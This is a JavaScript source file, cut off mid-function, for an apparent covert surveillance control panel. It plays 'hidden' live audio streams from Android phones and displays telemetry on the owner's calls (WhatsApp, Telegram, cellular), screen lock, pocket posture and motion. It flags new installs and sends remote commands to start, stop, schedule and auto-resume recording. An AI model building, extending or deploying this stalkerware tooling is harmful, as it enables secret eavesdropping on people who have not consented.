/**
 * hidden.js — Hidden Stealth Monitoring & Remote Control Center JS
 * Controls Live HLS player for hidden streams and remote device triggers.
 */

const API_LISTEN = '/api/v1/listen';
const API_DASHBOARD = '/api/v1/dashboard';
const POLL_INTERVAL = 4000;

const state = {
    sessions: [],
    dashboardSessions: [],
    currentSession: null,
    isPlaying: false,
    isLiveLock: true,
    deleteTargetId: null,
    deviceStatus: [],
};

const ui = {
    select: document.getElementById('session-select'),
    liveIndicator: document.getElementById('live-indicator'),
    trackName: document.getElementById('track-name'),
    trackMeta: document.getElementById('track-meta'),
    
    // Player
    audio: document.getElementById('audio-player'),
    btnPlay: document.getElementById('btn-play'),
    btnRewind: document.getElementById('btn-rewind'),
    btnJumpLive: document.getElementById('btn-jump-live'),
    iconPlay: document.getElementById('icon-play'),
    iconPause: document.getElementById('icon-pause'),
    speedSelect: document.getElementById('speed-select'),
    playerStateBadge: document.getElementById('player-state-badge'),
    telemetryActiveAppBadge: document.getElementById('telemetry-activeapp-badge'),
    telemetryCallAppBadge: document.getElementById('telemetry-callapp-badge'),
    telemetryPostureBadge: document.getElementById('telemetry-posture-badge'),
    telemetryTempBadge: document.getElementById('telemetry-temp-badge'),
    telemetryMotionBadge: document.getElementById('telemetry-motion-badge'),
    telemetryScreenBadge: document.getElementById('telemetry-screen-badge'),
    telemetryPowerBadge: document.getElementById('telemetry-power-badge'),
    telemetryRingerBadge: document.getElementById('telemetry-ringer-badge'),
    telemetryAudioBadge: document.getElementById('telemetry-audio-badge'),
    telemetryCallBadge: document.getElementById('telemetry-call-badge'),
    telemetryMicBadge: document.getElementById('telemetry-mic-badge'),
    telemetryBatteryBadge: document.getElementById('telemetry-battery-badge'),
    telemetryRouteBadge: document.getElementById('telemetry-route-badge'),
    latencyBadge: document.getElementById('latency-badge'),
    
    // Channel Panner
    btnChanBoth: document.getElementById('btn-chan-both'),
    btnChanLeft: document.getElementById('btn-chan-left'),
    btnChanRight: document.getElementById('btn-chan-right'),

    // Progress
    progressBar: document.getElementById('progress-bar-container'),
    progressFill: document.getElementById('progress-fill'),
    progressBuffer: document.getElementById('progress-buffer'),
    timeCurrent: document.getElementById('time-current'),
    timeTotal: document.getElementById('time-total'),
    
    // Visualizer
    canvas: document.getElementById('visualizer'),
    overlay: document.getElementById('visualizer-overlay'),
    
    // Stats
    statActive: document.getElementById('stat-active'),
    statInstalls: document.getElementById('stat-installs'),
    statSessions: document.getElementById('stat-sessions'),
    statChunks: document.getElementById('stat-chunks'),
    statDuration: document.getElementById('stat-duration'),
    statStorage: document.getElementById('stat-storage'),
    installAlertBanner: document.getElementById('install-alert-banner'),
    installAlertText: document.getElementById('install-alert-text'),
    btnCloseInstallAlert: document.getElementById('btn-close-install-alert'),
    
    // Dashboard List
    sessionList: document.getElementById('session-list'),
    sessionCount: document.getElementById('session-count'),
    btnRefresh: document.getElementById('btn-refresh'),
    clientFilter: document.getElementById('client-filter'),
    
    // Remote Control
    btnRemoteStart: document.getElementById('btn-remote-start'),
    btnRemoteStop: document.getElementById('btn-remote-stop'),
    btnToggleEco: document.getElementById('btn-toggle-eco'),
    btnRemoteRestartStream: document.getElementById('btn-remote-restart-stream'),
    btnRemoteRestartApp: document.getElementById('btn-remote-restart-app'),
    remoteClientSelect: document.getElementById('remote-client-select'),
    remoteStartTime: document.getElementById('remote-start-time'),
    remoteWatchdogInterval: document.getElementById('remote-watchdog-interval'),
    remoteStopTime: document.getElementById('remote-stop-time'),
    btnRemoteSchedule: document.getElementById('btn-remote-schedule'),
    telemetryEcoBadge: document.getElementById('telemetry-eco-badge'),
    
    tabAll: document.getElementById('tab-all'),
    tabPlayer: document.getElementById('tab-player'),
    tabDashboard: document.getElementById('tab-dashboard'),
    secPlayer: document.getElementById('sec-player'),
    secDashboard: document.getElementById('sec-dashboard'),
    secRemote: document.getElementById('sec-remote'),
    colLeft: document.getElementById('col-left'),
    colRight: document.getElementById('col-right'),
    gridContainer: document.getElementById('grid-container'),
    toastContainer: document.getElementById('toast-container'),
    
    // Modal
    modalOverlay: document.getElementById('modal-overlay'),
    modalSessionId: document.getElementById('modal-session-id'),
    modalCancel: document.getElementById('modal-cancel'),
    modalConfirm: document.getElementById('modal-confirm'),
    btnStealthLogout: document.getElementById('btn-stealth-logout'),
};

let hls = null;
let audioCtx = null;
let pannerNode = null;
let analyser = null;
let source = null;
let animationId = null;

document.addEventListener('DOMContentLoaded', () => {
    bindEvents();
    fetchAllData();
    initWebSocket();
    setInterval(fetchAllData, POLL_INTERVAL);
});

function bindEvents() {
    ui.btnStealthLogout?.addEventListener('click', async () => {
        try {
            await fetch('/api/v1/auth/logout', { method: 'POST' });
        } catch (_) {}
        window.location.href = '/login';
    });

    ui.select?.addEventListener('change', (e) => loadSession(e.target.value));
    ui.btnPlay?.addEventListener('click', togglePlay);
    ui.btnRewind?.addEventListener('click', rewind15);
    ui.btnJumpLive?.addEventListener('click', jumpToLive);
    ui.btnRefresh?.addEventListener('click', fetchAllData);
    ui.btnCloseInstallAlert?.addEventListener('click', () => {
        if (ui.installAlertBanner) ui.installAlertBanner.style.display = 'none';
    });

    if (ui.speedSelect) {
        ui.speedSelect.addEventListener('change', (e) => {
            ui.audio.playbackRate = parseFloat(e.target.value);
        });
    }

    if (ui.btnChanBoth) ui.btnChanBoth.addEventListener('click', () => setChannelPan(0, ui.btnChanBoth));
    if (ui.btnChanLeft) ui.btnChanLeft.addEventListener('click', () => setChannelPan(-1, ui.btnChanLeft));
    if (ui.btnChanRight) ui.btnChanRight.addEventListener('click', () => setChannelPan(1, ui.btnChanRight));

    if (ui.clientFilter) {
        ui.clientFilter.addEventListener('change', () => renderSessionsList());
    }
    
    if (ui.btnRemoteStart) ui.btnRemoteStart.addEventListener('click', () => sendRemoteCommand('START'));
    if (ui.btnRemoteStop) ui.btnRemoteStop.addEventListener('click', () => sendRemoteCommand('STOP'));
    if (ui.btnToggleEco) ui.btnToggleEco.addEventListener('click', toggleEcoMode);
    if (ui.btnRemoteRestartStream) ui.btnRemoteRestartStream.addEventListener('click', () => sendRemoteRestart('stream'));
    if (ui.btnRemoteRestartApp) ui.btnRemoteRestartApp.addEventListener('click', () => sendRemoteRestart('app'));
    if (ui.btnRemoteSchedule) ui.btnRemoteSchedule.addEventListener('click', sendRemoteSchedule);
    
    ui.tabAll?.addEventListener('click', () => setViewMode('all'));
    ui.tabPlayer?.addEventListener('click', () => setViewMode('player'));
    ui.tabDashboard?.addEventListener('click', () => setViewMode('dashboard'));

    ui.modalCancel?.addEventListener('click', closeModal);
    ui.modalConfirm?.addEventListener('click', confirmDelete);

    document.getElementById('btn-close-downloader')?.addEventListener('click', () => {
        document.getElementById('modal-downloader-overlay').classList.remove('active');
        document.getElementById('downloader-iframe').src = '';
    });

    ui.audio.addEventListener('play', () => {
        setPlayingState(true);
        if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Playing';
    });
    ui.audio.addEventListener('pause', () => {
        setPlayingState(false);
        if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Paused';
    });
    ui.audio.addEventListener('waiting', () => {
        if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Buffering...';
    });
    ui.audio.addEventListener('stalled', () => {
        if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Reconnecting...';
    });
    ui.audio.addEventListener('error', () => {
        if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Stream Error';
    });
    ui.audio.addEventListener('timeupdate', updateProgress);
    
    ui.progressBar?.addEventListener('click', (e) => {
        if (!state.currentSession || !ui.audio.duration) return;
        const rect = ui.progressBar.getBoundingClientRect();
        const pct = (e.clientX - rect.left) / rect.width;
        ui.audio.currentTime = pct * ui.audio.duration;
        state.isLiveLock = false;
        ui.btnJumpLive?.classList.remove('active');
    });
}

function setViewMode(mode) {
    [ui.tabAll, ui.tabPlayer, ui.tabDashboard].forEach(btn => btn?.classList.remove('active'));

    if (mode === 'all') {
        ui.tabAll?.classList.add('active');
        if (ui.colLeft) ui.colLeft.style.display = 'flex';
        if (ui.colRight) ui.colRight.style.display = 'flex';
        if (window.innerWidth > 1024) {
            ui.gridContainer.style.gridTemplateColumns = 'minmax(380px, 460px) minmax(520px, 1fr)';
        } else {
            ui.gridContainer.style.gridTemplateColumns = '1fr';
        }
    } else if (mode === 'player') {
        ui.tabPlayer?.classList.add('active');
        if (ui.colLeft) ui.colLeft.style.display = 'flex';
        if (ui.colRight) ui.colRight.style.display = 'none';
        ui.gridContainer.style.gridTemplateColumns = '1fr';
    } else if (mode === 'dashboard') {
        ui.tabDashboard?.classList.add('active');
        if (ui.colLeft) ui.colLeft.style.display = 'none';
        if (ui.colRight) ui.colRight.style.display = 'flex';
        ui.gridContainer.style.gridTemplateColumns = '1fr';
    }
}

async function fetchAllData() {
    await Promise.all([fetchActiveSessions(), fetchStats(), fetchAllSessions(), fetchDeviceStatus(), fetchInstalls()]);
}

async function fetchInstalls() {
    try {
        const res = await fetch(`${API_DASHBOARD}/installs`);
        if (!res.ok) return;
        const data = await res.json();
        if (ui.statInstalls) {
            ui.statInstalls.textContent = data.total || 0;
        }
    } catch (e) {
        console.error('Installs fetch error:', e);
    }
}

function initWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/device?client_id=stealth_dashboard`;
    try {
        const ws = new WebSocket(wsUrl);
        ws.onopen = () => {
            console.log('[ws] Stealth dashboard connected to real-time events');
        };
        ws.onmessage = (event) => {
            try {
                const msg = JSON.parse(event.data);
                if (msg.type === 'new_install' && msg.data) {
                    handleNewInstallEvent(msg.data);
                } else if (msg.type === 'live_telemetry') {
                    handleLiveTelemetryMessage(msg);
                } else if (msg.type === 'device_boot') {
                    showToast(`📱 Device ${msg.clientId} restarted & resumed recording!`, 'success');
                    fetchAllData();
                } else if (msg.type === 'watchdog_activation') {
                    const act = msg.action === 'started_recording' ? 'Started Recording' : 'Verified Healthy';
                    showToast(`⏰ 2-Hour Watchdog: ${act} for ${msg.clientId}`, 'info');
                    fetchAllData();
                }
            } catch (e) { }
        };
        ws.onclose = () => {
            setTimeout(initWebSocket, 4000);
        };
        ws.onerror = (e) => {
            console.warn('[ws] Socket warning:', e);
        };
    } catch (err) {
        console.warn('Dashboard live WebSocket error:', err);
    }
}

function handleNewInstallEvent(data) {
    fetchInstalls();
    if (ui.installAlertBanner && ui.installAlertText) {
        const model = `${data.manufacturer || 'Android'} ${data.device_model || ''}`.trim();
        const os = data.os_version ? `(${data.os_version})` : '';
        ui.installAlertText.textContent = `New App Installation: ${model} ${os} just launched the app!`;
        ui.installAlertBanner.style.display = 'flex';
    }
    showToast(`🎉 New Device Installed: ${data.device_model || 'Device'}`, 'success');
}

async function fetchDeviceStatus() {
    try {
        const res = await fetch(`${API_DASHBOARD}/devices`);
        if (!res.ok) return;
        const data = await res.json();
        state.deviceStatus = data.devices || [];
        updateRemoteSelectUI();
    } catch (e) {
        console.error('Device status fetch error:', e);
    }
}

async function fetchActiveSessions() {
    try {
        const res = await fetch(`${API_LISTEN}/active?type=hidden`);
        if (!res.ok) return;
        const data = await res.json();
        updateActiveSessions(data.sessions || []);
    } catch (e) {
        console.error('Active sessions fetch error:', e);
    }
}

function updateActiveSessions(sessions) {
    const prev = ui.select.value;
    state.sessions = sessions;
    
    ui.select.innerHTML = '';
    
    if (sessions.length === 0) {
        ui.select.innerHTML = '<option value="">No live hidden broadcasts right now</option>';
        ui.select.disabled = true;
    } else {
        sessions.forEach(s => {
            const opt = document.createElement('option');
            opt.value = s.session_id;
            const dev = s.device_info ? ` — ${s.device_info}` : '';
            opt.textContent = `🟢 ${s.client_name}${dev} (LIVE)`;
            ui.select.appendChild(opt);
        });
        ui.select.disabled = false;
        
        if (prev && sessions.find(s => s.session_id === prev)) {
            ui.select.value = prev;
        } else if (sessions.length === 1 && !state.currentSession) {
            ui.select.value = sessions[0].session_id;
            loadSession(sessions[0].session_id);
        }
    }
}

async function fetchStats() {
    try {
        const res = await fetch(`${API_DASHBOARD}/stats?type=hidden`);
        if (!res.ok) return;
        const data = await res.json();
        
        if (ui.statActive) ui.statActive.textContent = data.active_sessions || 0;
        if (ui.statSessions) ui.statSessions.textContent = data.total_sessions || 0;
        if (ui.statChunks) ui.statChunks.textContent = data.total_chunks || 0;
        if (ui.statDuration) ui.statDuration.textContent = data.total_duration_human || '00:00';
        if (ui.statStorage) ui.statStorage.textContent = data.total_size_human || '0 B';
    } catch (e) {
        console.error('Stats fetch error:', e);
    }
}

async function fetchAllSessions() {
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions?type=hidden&limit=200`);
        if (!res.ok) return;
        const data = await res.json();
        state.dashboardSessions = data.sessions || [];
        renderSessionsList();
    } catch (e) {
        console.error('All sessions fetch error:', e);
    }
}

function updateRemoteSelectUI() {
    if (!ui.remoteClientSelect) return;
    const selectedRemote = ui.remoteClientSelect.value;
    const allClients = [...new Set([
        ...state.deviceStatus.map(d => d.client_id),
        ...state.dashboardSessions.map(s => s.client_name).filter(Boolean)
    ])];
    
    let remoteHtml = '<option value="">Select Target Device...</option>';
    allClients.forEach(c => {
        const deviceData = state.deviceStatus.find(d => d.client_id === c);
        const status = deviceData ? deviceData.status : 'offline';
        let icon = '🔴';
        if (status === 'recording') icon = '🟢';
        else if (status === 'idle') icon = '🟡';
        
        remoteHtml += `<option value="${c}" ${c === selectedRemote ? 'selected' : ''}>${icon} ${c} (${status})</option>`;
    });
    ui.remoteClientSelect.innerHTML = remoteHtml;
}

function renderSessionsList() {
    const allSessions = state.dashboardSessions;

    if (ui.clientFilter) {
        const selectedClient = ui.clientFilter.value;
        const clients = [...new Set(allSessions.map(s => s.client_name).filter(Boolean))];
        
        let filterHtml = '<option value="">All Devices / Clients</option>';
        clients.forEach(c => {
            filterHtml += `<option value="${c}" ${c === selectedClient ? 'selected' : ''}>📱 ${c}</option>`;
        });
        ui.clientFilter.innerHTML = filterHtml;
    }

    updateRemoteSelectUI();

    const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
    const sessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;

    if (ui.sessionCount) {
        ui.sessionCount.textContent = `${sessions.length} hidden session${sessions.length !== 1 ? 's' : ''}`;
    }

    if (sessions.length === 0) {
        ui.sessionList.innerHTML = '<li class="empty-state">No hidden broadcast sessions recorded.</li>';
    } else {
        ui.sessionList.innerHTML = generateSessionsHtml(sessions);
    }
}

function generateSessionsHtml(sessionsArray) {
    return sessionsArray.map(s => {
        const isLive = s.status === 'live';
        const statusClass = isLive ? 'live' : 'ended';
        const badgeText = isLive ? '● LIVE' : 'ENDED';
        const duration = formatTime(s.total_duration || 0);
        const dateStr = formatIST(s.created_at);
        const sizeStr = formatSize(s.total_bytes || 0);
        const client = s.client_name || 'Unknown Device';
        const shortId = s.session_id.slice(0, 8);
        const hlsUrl = `${window.location.origin}/storage/sessions/${s.session_id}/hls/vod.m3u8`;
        const downloadUrl = `/api/v1/broadcasts/${s.session_id}/export-channel`;
        const chunkZipUrl = `/api/v1/broadcasts/${s.session_id}/export-channel?format=zip`;

        return `
            <li class="session-card session-card--${statusClass}">
                <div class="session-card__header">
                    <div class="session-card__device">
                        <div class="device-icon ${isLive ? 'device-icon--live' : ''}">📱</div>
                        <div class="device-details">
                            <div class="session-card__title">
                                <span class="client-name">${client}</span>
                                <span class="badge badge--${statusClass}">${badgeText}</span>
                                ${isLive ? `<span class="live-ping-dot" title="Streaming Live"></span>` : ''}
                            </div>
                            <div class="device-sub">${s.device_info || 'Android Device'}</div>
                        </div>
                    </div>

                    <div class="session-card__quick-play">
                        <button class="btn-quick-play ${isLive ? 'btn-quick-play--live' : ''}" onclick="loadSession('${s.session_id}')" title="Listen in Live Player">
                            ▶ ${isLive ? 'Listen Live' : 'Play Recording'}
                        </button>
                    </div>
                </div>

                <div class="session-card__meta-bar">
                    <div class="meta-chip" title="Total Duration">
                        <span class="meta-chip__icon">⏱️</span>
                        <span class="meta-chip__val">${duration}</span>
                    </div>
                    <div class="meta-chip" title="Total Chunks">
                        <span class="meta-chip__icon">📦</span>
                        <span class="meta-chip__val">${(s.total_chunks || 0).toLocaleString()} chunks</span>
                    </div>
                    <div class="meta-chip" title="Audio Data Size">
                        <span class="meta-chip__icon">💾</span>
                        <span class="meta-chip__val">${sizeStr}</span>
                    </div>
                    <div class="meta-chip" title="Session Started (IST)">
                        <span class="meta-chip__icon">📅</span>
                        <span class="meta-chip__val">${dateStr}</span>
                    </div>
                    <div class="meta-chip meta-chip--id" onclick="copySessionId('${s.session_id}')" title="Copy Session ID">
                        <span class="meta-chip__icon">🆔</span>
                        <code class="meta-chip__code">${shortId}...</code>
                    </div>
                </div>

                <div class="session-card__toolbar">
                    <div class="action-group-primary">
                        <button class="action-btn action-btn--pro" onclick="openDownloaderModal('${hlsUrl}')" title="High-Speed Segment Downloader">
                            <span class="action-btn__icon">🚀</span>
                            <span>Pro Download</span>
                        </button>
                        <a href="${downloadUrl}" target="_blank" class="action-btn action-btn--audio" title="Download Audio File">
                            <span class="action-btn__icon">📥</span>
                            <span>Download Audio</span>
                        </a>
                        <a href="${chunkZipUrl}" target="_blank" class="action-btn action-btn--zip" title="Download Chunks ZIP">
                            <span class="action-btn__icon">🗜️</span>
                            <span>Chunks ZIP</span>
                        </a>
                    </div>

                    <div class="action-group-secondary">
                        <button class="action-btn action-btn--ghost" onclick="copyHlsLink('${hlsUrl}')" title="Copy Stream URL">
                            <span class="action-btn__icon">🔗</span>
                            <span>Copy Link</span>
                        </button>
                        ${isLive ? `
                        <button class="action-btn action-btn--warning" onclick="endLiveSession('${s.session_id}')" title="End this session">
                            <span class="action-btn__icon">⏹️</span>
                            <span>End Session</span>
                        </button>` : `
                        <button class="action-btn action-btn--reactivate" onclick="activateSession('${s.session_id}')" title="Make Live">
                            <span class="action-btn__icon">🔄</span>
                            <span>Make Live</span>
                        </button>`}
                        <button class="action-btn action-btn--danger" onclick="openDeleteModal('${s.session_id}')" title="Delete Session">
                            <span class="action-btn__icon">🗑️</span>
                        </button>
                    </div>
                </div>
            </li>
        `;
    }).join('');
}

// ════════════════════════════════════════════════════════════════════════════
// PLAYER & HLS STREAMING
// ════════════════════════════════════════════════════════════════════════════

function loadSession(sessionId) {
    if (!sessionId) return;
    const session = state.sessions.find(s => s.session_id === sessionId) 
                 || state.dashboardSessions.find(s => s.session_id === sessionId);
    if (!session) return;

    state.currentSession = session;
    ui.trackName.textContent = session.client_name || 'Android Device';
    ui.trackMeta.textContent = session.device_info ? `Device: ${session.device_info}` : `ID: ${session.session_id}`;
    ui.overlay.style.display = 'none';

    const isLive = session.status === 'live';
    const streamUrl = isLive
        ? `${window.location.origin}/storage/sessions/${session.session_id}/hls/live.m3u8`
        : `${window.location.origin}/storage/sessions/${session.session_id}/hls/vod.m3u8`;

    if (Hls.isSupported()) {
        if (hls) hls.destroy();
        hls = new Hls({
            liveSyncDurationCount: 3,
            liveMaxLatencyDurationCount: 6,
            enableWorker: true,
            lowLatencyMode: true,
        });

        hls.loadSource(streamUrl);
        hls.attachMedia(ui.audio);

        hls.on(Hls.Events.MANIFEST_PARSED, () => {
            ui.btnPlay.disabled = false;
            ui.btnRewind.disabled = false;
            ui.audio.play().catch(() => setPlayingState(false));
            initAudioContext();
            startVisualizer();
        });

        hls.on(Hls.Events.LEVEL_LOADED, (_event, data) => {
            const details = data.details;
            if (details.live) {
                ui.liveIndicator.textContent = 'LIVE';
                ui.liveIndicator.className = 'live-pill live-pill--active';
                if (details.fragments && details.fragments.length > 0) {
                    const latestFrag = details.fragments[details.fragments.length - 1];
                    parseTelemetryFromSegmentName(latestFrag.relurl || latestFrag.url || '');
                }
            } else {
                ui.liveIndicator.textContent = 'RECORDED';
                ui.liveIndicator.className = 'live-pill live-pill--vod';
            }
        });
    } else if (ui.audio.canPlayType('application/vnd.apple.mpegurl')) {
        ui.audio.src = streamUrl;
        ui.audio.play().catch(() => setPlayingState(false));
    }
}

function parseTelemetryFromSegmentName(segUrl) {
    const bMatch = segUrl.match(/_B(-?\d+)/);
    const sMatch = segUrl.match(/_S(-?\d+)/);
    const oMatch = segUrl.match(/_O([A-Z]{3})/);
    const dMatch = segUrl.match(/_D([01])/);
    const uMatch = segUrl.match(/_U([01])/);
    const cMatch = segUrl.match(/_C([A-Z0-9]+)/);
    const rMatch = segUrl.match(/_R([A-Z0-9]+)/);
    const vMatch = segUrl.match(/_V([01])/);
    const dbMatch = segUrl.match(/_dB(\d+)/);

    const tMatch = segUrl.match(/_T(\d+)/);
    const mMatch = segUrl.match(/_M([01])/);
    const pMatch = segUrl.match(/_P([A-Z]+)/);
    const aMatch = segUrl.match(/_A([A-Z0-9]+)/);

    // Battery
    if (bMatch && ui.telemetryBatteryBadge) {
        const pct = parseInt(bMatch[1], 10);
        ui.telemetryBatteryBadge.textContent = pct >= 0 ? `🔋 Battery: ${pct}%` : '🔋 Battery: --%';
    }

    // Audio Route
    if (oMatch && ui.telemetryRouteBadge) {
        const code = oMatch[1];
        const names = { 'SPK': '🔊 Speaker', 'JCK': '🎧 Wired Jack', 'BLU': '📡 Bluetooth' };
        ui.telemetryRouteBadge.textContent = names[code] || `🔊 Output: ${code}`;
    }

    // 1. Screen & Lock State
    if (dMatch && ui.telemetryScreenBadge) {
        const isScreenOn = dMatch[1] === '1';
        const isUnlocked = uMatch ? uMatch[1] === '1' : false;
        if (isScreenOn) {
            if (isUnlocked) {
                ui.telemetryScreenBadge.textContent = '📱 Screen: ON (Unlocked)';
                ui.telemetryScreenBadge.className = 'status-badge status-badge--cyan';
            } else {
                ui.telemetryScreenBadge.textContent = '📱 Screen: ON (Locked)';
                ui.telemetryScreenBadge.className = 'status-badge status-badge--yellow';
            }
        } else {
            ui.telemetryScreenBadge.textContent = '🌑 Screen: OFF';
            ui.telemetryScreenBadge.className = 'status-badge';
        }
    }

    // 2. Power Source / PC Connection
    if (cMatch && ui.telemetryPowerBadge) {
        const pCode = cMatch[1];
        if (pCode === 'CUSB') {
            ui.telemetryPowerBadge.textContent = '💻 Power: USB (PC Connected)';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--purple';
        } else if (pCode === 'CAC') {
            ui.telemetryPowerBadge.textContent = '⚡ Power: Wall AC Charging';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--green';
        } else if (pCode === 'CWIR') {
            ui.telemetryPowerBadge.textContent = '🛜 Power: Wireless Charging';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--cyan';
        } else {
            ui.telemetryPowerBadge.textContent = '🔋 Power: On Battery';
            ui.telemetryPowerBadge.className = 'status-badge';
        }
    }

    // 3. Ringer Mode
    if (rMatch && ui.telemetryRingerBadge) {
        const rCode = rMatch[1];
        if (rCode === 'RS') {
            ui.telemetryRingerBadge.textContent = '🔇 Ringer: Silent';
            ui.telemetryRingerBadge.className = 'status-badge status-badge--orange';
        } else if (rCode === 'RV') {
            ui.telemetryRingerBadge.textContent = '📳 Ringer: Vibrate';
            ui.telemetryRingerBadge.className = 'status-badge status-badge--yellow';
        } else {
            ui.telemetryRingerBadge.textContent = '🔔 Ringer: Normal';
            ui.telemetryRingerBadge.className = 'status-badge';
        }
    }

    // 4. Voice / Speech & Decibels
    if ((vMatch || dbMatch) && ui.telemetryAudioBadge) {
        const isVoice = vMatch ? vMatch[1] === '1' : false;
        const db = dbMatch ? parseInt(dbMatch[1], 10) : 0;
        if (isVoice) {
            ui.telemetryAudioBadge.textContent = `🗣️ Voice Active (${db}dB)`;
            ui.telemetryAudioBadge.className = 'status-badge status-badge--green';
        } else {
            ui.telemetryAudioBadge.textContent = `🤫 Ambient (${db}dB)`;
            ui.telemetryAudioBadge.className = 'status-badge';
        }
    }

    // 5. Active Call & Mic App
    if (aMatch && ui.telemetryCallAppBadge) {
        const aCode = aMatch[1];
        if (aCode === 'AWA') {
            ui.telemetryCallAppBadge.textContent = '🟢 Call: WhatsApp';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
        } else if (aCode === 'AIG') {
            ui.telemetryCallAppBadge.textContent = '🟣 Call: Instagram';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--purple';
        } else if (aCode === 'ATG') {
            ui.telemetryCallAppBadge.textContent = '🔵 Call: Telegram';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
        } else if (aCode === 'AZOOM') {
            ui.telemetryCallAppBadge.textContent = '💻 Call: Zoom';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--blue';
        } else if (aCode === 'AMEET') {
            ui.telemetryCallAppBadge.textContent = '📹 Call: Google Meet';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
        } else if (aCode === 'ACELL') {
            ui.telemetryCallAppBadge.textContent = '📞 Call: Cellular Phone';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
        } else if (aCode === 'AMIC') {
            ui.telemetryCallAppBadge.textContent = '🎙️ Mic: In Use (External App)';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--orange';
        } else if (aCode === 'AVOIP') {
            ui.telemetryCallAppBadge.textContent = '🌐 Call: VoIP (Encrypted)';
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
        } else if (aCode !== 'AIDLE') {
            ui.telemetryCallAppBadge.textContent = `📞 Call: ${aCode.replace(/^A/, '')}`;
            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
        } else {
            ui.telemetryCallAppBadge.textContent = '📞 Call: None';
            ui.telemetryCallAppBadge.className = 'status-badge';
        }
    }

    // 6. Posture (Pocket / Desk / Hand)
    if (pMatch && ui.telemetryPostureBadge) {
        const pCode = pMatch[1];
        if (pCode === 'POCK') {
            ui.telemetryPostureBadge.textContent = '👖 Posture: In Pocket / Face-Down';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--purple';
        } else if (pCode === 'DESK') {
            ui.telemetryPostureBadge.textContent = '🪵 Posture: On Desk (Face-Up)';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--cyan';
        } else if (pCode === 'OPEN') {
            ui.telemetryPostureBadge.textContent = '✋ Posture: In Hand (Active)';
            ui.telemetryPostureBadge.className = 'status-badge status-badge--green';
        } else {
            ui.telemetryPostureBadge.textContent = `📱 Posture: ${pCode}`;
            ui.telemetryPostureBadge.className = 'status-badge';
        }
    }

    // 7. Battery Temperature
    if (tMatch && ui.telemetryTempBadge) {
        const temp = parseInt(tMatch[1], 10);
        ui.telemetryTempBadge.textContent = temp > 0 ? `🌡️ Temp: ${temp}°C` : '🌡️ Temp: --°C';
        ui.telemetryTempBadge.className = temp >= 40 ? 'status-badge status-badge--red' : 'status-badge';
    }

    // 8. Physical Motion
    if (mMatch && ui.telemetryMotionBadge) {
        const isMoving = mMatch[1] === '1';
        if (isMoving) {
            ui.telemetryMotionBadge.textContent = '🏃 Motion: Moving / Picked Up';
            ui.telemetryMotionBadge.className = 'status-badge status-badge--green';
        } else {
            ui.telemetryMotionBadge.textContent = '🪑 Motion: Still';
            ui.telemetryMotionBadge.className = 'status-badge';
        }
    }
}

function handleLiveTelemetryMessage(msg) {
    if (msg.battery !== undefined && ui.telemetryBatteryBadge) {
        ui.telemetryBatteryBadge.textContent = `🔋 Battery: ${msg.battery}%`;
    }
    if (msg.route && ui.telemetryRouteBadge) {
        const names = { 'SPK': '🔊 Speaker', 'JCK': '🎧 Wired Jack', 'BLU': '📡 Bluetooth' };
        ui.telemetryRouteBadge.textContent = names[msg.route] || `🔊 Output: ${msg.route}`;
    }
    if (msg.screenOn !== undefined && ui.telemetryScreenBadge) {
        if (msg.screenOn) {
            ui.telemetryScreenBadge.textContent = msg.isUnlocked ? '📱 Screen: ON (Unlocked)' : '📱 Screen: ON (Locked)';
            ui.telemetryScreenBadge.className = msg.isUnlocked ? 'status-badge status-badge--cyan' : 'status-badge status-badge--yellow';
        } else {
            ui.telemetryScreenBadge.textContent = '🌑 Screen: OFF';
            ui.telemetryScreenBadge.className = 'status-badge';
        }
    }
    if (msg.powerSource && ui.telemetryPowerBadge) {
        const pCode = msg.powerSource;
        if (pCode === 'CUSB') {
            ui.telemetryPowerBadge.textContent = '💻 Power: USB (PC Connected)';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--purple';
        } else if (pCode === 'CAC') {
            ui.telemetryPowerBadge.textContent = '⚡ Power: Wall AC Charging';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--green';
        } else if (pCode === 'CWIR') {
            ui.telemetryPowerBadge.textContent = '🛜 Power: Wireless Charging';
            ui.telemetryPowerBadge.className = 'status-badge status-badge--cyan';
        } else {
            ui.telemetryPowerBadge.textContent = '🔋 Power: On Battery';
            ui.telemetryPowerBadge.className = 'status-badge';
        }
    }
    if (msg.ringerMode && ui.telemetryRingerBadge) {
        if (msg.ringerMode === 'RS') {
            ui.telemetryRingerBadge.textContent = '🔇 Ringer: Silent';
            ui.telemetryRingerBadge.className = 'status-badge status-badge--orange';
        } else if (msg.ringerMode === 'RV') {
            ui.telemetryRingerBadge.textContent = '📳 Ringer: Vibrate';
            ui.telemetryRingerBadge.className = 'status-badge status-badge--yellow';
        } else {
            ui.telemetryRingerBadge.textContent = '🔔 Ringer: Normal';
            ui.telemetryRingerBadge.className = 'status-badge';
        }
    }
    if (ui.telemetryActiveAppBadge) {
        if (msg.screenOn && msg.callPkg) {
            ui.telemetryActiveAppBadge.textContent = `📱 Using: ${msg.callPkg}`;
            ui.telemetryActiveAppBadge.className = 'status-badge status-badge--cyan';
        } else if (!msg.screenOn) {
            ui.telemetryActiveAppBadge.textContent = '🌑 Screen OFF';
            ui.telemetryActiveAppBadge.className = 'status-badge';
        } else {
